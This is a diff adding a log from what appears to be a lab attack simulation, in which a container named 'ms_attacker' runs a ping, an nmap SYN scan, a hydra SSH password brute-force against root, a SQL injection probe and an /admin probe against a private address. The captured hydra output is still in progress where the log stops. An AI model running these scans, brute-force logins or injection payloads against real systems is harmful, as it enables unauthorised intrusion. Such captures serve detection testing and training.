@@ -1,0 +1,25 @@
+[2026-04-27T01:54:48Z] attacks capture start
+$ docker exec ms_attacker ping -c 3 10.201.0.20; docker exec ms_attacker nmap -sS -p 80 --max-retries 1 10.201.0.20 || true; docker exec ms_attacker hydra -l root -P /tmp/wordlist.txt -t 2 -f ssh://10.201.0.20 || true; docker exec ms_attacker curl -m 5 -sS 'http://10.201.0.20/?id=1+UNION+SELECT+1,2' || true; docker exec ms_attacker curl -m 5 -sS 'http://10.201.0.20/admin' || true
+PING 10.201.0.20 (10.201.0.20) 56(84) bytes of data.
+
+--- 10.201.0.20 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 2070ms
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-27 01:55 UTC
+Nmap scan report for 10.201.0.20
+Host is up (0.0022s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 01:55:01
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 1000 login tries (l:1/p:1000), ~500 tries per task
+[DATA] attacking ssh://10.201.0.20:22/
+[STATUS] 22.00 tries/min, 22 tries in 00:01h, 978 to do in 00:45h, 2 active
+[STATUS] 14.00 tries/min, 42 tries in 00:03h, 958 to do in 01:09h, 2 active
+[STATUS] 13.14 tries/min, 92 tries in 00:07h, 908 to do in 01:10h, 2 active
+[STATUS] 12.42 tries/min, 149 tries in 00:12h, 851 to do in 01:09h, 2 active
+[STATUS] 9.82 tries/min, 167 tries in 00:17h, 833 to do in 01:25h, 2 active
